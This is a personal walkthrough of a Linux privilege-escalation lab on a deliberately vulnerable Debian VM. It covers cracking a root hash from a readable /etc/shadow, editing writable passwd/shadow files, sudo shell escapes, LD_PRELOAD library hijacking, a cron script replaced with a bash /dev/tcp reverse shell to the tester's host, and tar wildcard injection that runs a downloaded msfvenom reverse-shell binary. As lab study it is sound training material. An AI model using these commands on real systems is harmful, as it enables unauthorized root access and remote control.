
export IP: 10.10.250.170

Deploy the Vulnerable Debian VM

Prechecks:

1. scan network

```
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.10.250.170
PING 10.10.250.170 (10.10.250.170) 56(84) bytes of data.
64 bytes from 10.10.250.170: icmp_seq=1 ttl=61 time=331 ms

--- 10.10.250.170 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 331.119/331.119/331.119/0.000 ms
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 

```
2. connect to the machine via ssh


Deploy the machine and login to the "user" account using SSH.

However, doing so will not provide access yet:

```

┌──(kali㉿kali)-[~]
└─$ ssh user@10.10.198.210
Unable to negotiate with 10.10.198.210 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                                             
┌──(kali㉿kali)-[~]

```

To do this, you must add -o HostKeyAlgorithms=+ssh-rsa or -o HostKeyAlgorithms=+ssh-dss

```

┌──(kali㉿kali)-[~/.ssh]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa user@10.10.198.210
The authenticity of host '10.10.198.210 (10.10.198.210)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.198.210' (RSA) to the list of known hosts.
user@10.10.198.210's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ 

```


Run the "id" command. What is the result?
Ans. uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:~$ 

```

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

ls -l /etc/shadow

View the contents of the /etc/shadow file:

cat /etc/shadow

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Switch to the root user, using the cracked password:

su root

=====

What is the root user's password hash?
Ans.$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123

```
user@debian:~$ nano /etc/shadow
user@debian:~$ 

```


What hashing algorithm was used to produce the root user's password hash?
Ans. sha512crypt

```
┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --pot=CrackedHash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2022-08-11 09:41) 2.040g/s 3134p/s 3134c/s 3134C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                               
┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]

```


What is the root user's password?
Ans. password123

===

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:

ls -l /etc/shadow

Generate a new password hash with a password of your choice:

mkpasswd -m sha-512 newpasswordhere

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

su root

```
user@debian:~$ mkpasswd -m sha-512 newpasswordhere
$6$PUzQYfDLSGMw/yF$MR0Qg6SPndWLRT2Pe1Yi7Ubh2CZOZp0Oi5NnbxIty3i5m8s4oJ7goK4gz0SP./LRBMjyxSSEy.6DILE9r/MQu.
user@debian:~$ 

```
```
user@debian:~$ nano /etc/shadow
user@debian:~$ su root
Password: 
root@debian:/home/user# 
```

===========END OF MACHINE=======

cont.

export IP: 10.10.217.88

ssh -o HostKeyAlgorithms=+ssh-rsa user@10.10.217.88

```
┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ ping 10.10.217.88              
PING 10.10.217.88 (10.10.217.88) 56(84) bytes of data.
64 bytes from 10.10.217.88: icmp_seq=1 ttl=61 time=442 ms
^C
--- 10.10.217.88 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss, time 1002ms
rtt min/avg/max/mdev = 441.789/441.789/441.789/0.000 ms
                                                                                                                       
┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ 

┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa user@10.10.217.88

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ 

```

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

ls -l /etc/passwd

Generate a new password hash with a password of your choice:

openssl passwd newpasswordhere

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

su root
Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

su newroot

Remember to exit out of the root shell before continuing!

```

user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssh passwd newpasswordhere
-bash: openssh: command not found
user@debian:~$ openssl passwd newpasswordhere
Warning: truncating password to 8 characters
LTtIm7YDnG7cA
user@debian:~$ nano /etc/passwd
user@debian:~$ su newroot
Password: 
root@debian:/home/user# 

```


Run the "id" command as the newroot user. What is the result?
uid=0(root) gid=0(root) groups=0(root)

```
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# 

```



===

List the programs which sudo allows your user to run:

sudo -l

Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

Remember to exit out of the root shell before continuing!

How many programs is "user" allowed to run via sudo? 
11

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ 
```

One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
Apache2

Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.


Sample: from GTFObins

```
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

find . -exec /bin/sh \; -quit
```


===

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

sudo -l

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

```

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here

user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so iftop
root@debian:/home/user#

```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

```
ldd /usr/sbin/apache2

user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fffd85ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8eed7ae000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f8eed58a000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f8eed350000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f8eed134000)
        libc.so.6 => /lib/libc.so.6 (0x00007f8eecdc8000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f8eecbc3000)
        librt.so.1 => /lib/librt.so.1 (0x00007f8eec9bb000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f8eec784000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f8eec57f000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f8eec357000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f8eedc6b000)

```


Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

```

sudo LD_LIBRARY_PATH=/tmp apache2

user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user# whoami
root
root@debian:/home/user# echo $IP

root@debian:/home/user# echo $SHELL
/bin/bash


```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

Remember to exit out of the root shell before continuing!

Answer the questions below
Read and follow along with the above.


====
Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

```
cat /etc/crontab

user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

user@debian:~$ 

```


There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

```

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

Locate the full path of the overwrite.sh file:

locate overwrite.sh

Note that the file is world-writable:

ls -l /usr/local/bin/overwrite.sh

```

user@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 818.6 days)
/usr/local/bin/overwrite.sh
user@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
user@debian:~$ 

```

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.



```

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1



user@debian:~$ nano /usr/local/bin/overwrite.sh 
bash -i >& /dev/tcp/10.2.77.171/4444 0>&1
#echo `date` > /tmp/useless

```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444       
listening on [any] 4444 ...
connect to [10.2.77.171] from (UNKNOWN) [10.10.217.88] 49697
bash: no job control in this shell
root@debian:~# whoami
whoami
root
root@debian:~# pwd 
pwd
/root
root@debian:~# echo $SHELL
echo $SHELL
/bin/sh
root@debian:~# exit
exit
exit
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

```

===
Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

```
cat /etc/crontab

user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```
rootbash-4.1# nano overwrite.sh

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

```

Make sure that the file is executable:

```
user@debian:~$ chmod +x overwrite.sh 

```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

```
/tmp/rootbash -p

user@debian:~$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# echo $SHELL
/bin/bash
rootbash-4.1# 

```

Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

```
rm /tmp/rootbash
exit
```

What is the value of the PATH variable in /etc/crontab?
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


===
Cron Jobs - Wildcards

View the contents of the other cron job script:

```
cat /usr/local/bin/compress.sh

user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
user@debian:~$ 

```

Note that the tar command is being run with a wildcard (_*_) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf


┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.77.171 LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf

```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

`touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf`

```
user@debian:~$ wget "http://10.2.77.171:8080/shell.elf"
--2022-08-11 23:00:06--  http://10.2.77.171:8080/shell.elf
Connecting to 10.2.77.171:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: “shell.elf”

100%[=============================================================================>] 194         --.-K/s   in 0s      

2022-08-11 23:00:07 (40.2 MB/s) - “shell.elf” saved [194/194]

user@debian:~$ ls
myvpn.ovpn  overwrite.sh  shell.elf  tools
user@debian:~$ chmod +x shell.elf 
user@debian:~$ 


```

```

user@debian:~$ touch /home/user/--checkpoint=1                    
user@debian:~$ pwd
/home/user
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
user@debian:~$ 

```

When the tar command in the cron job runs, the wildcard * will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

```

┌──(kali㉿kali)-[~/ken/brainstack/linuxprivsec]
└─$ nc -lnvp 4444                                                                           
listening on [any] 4444 ...
connect to [10.2.77.171] from (UNKNOWN) [10.10.217.88] 49768
whoami
root
pwd
/home/user
echo $SHELL
/bin/bash

```


Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

`rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
`

===
TERMINATED MACHINE


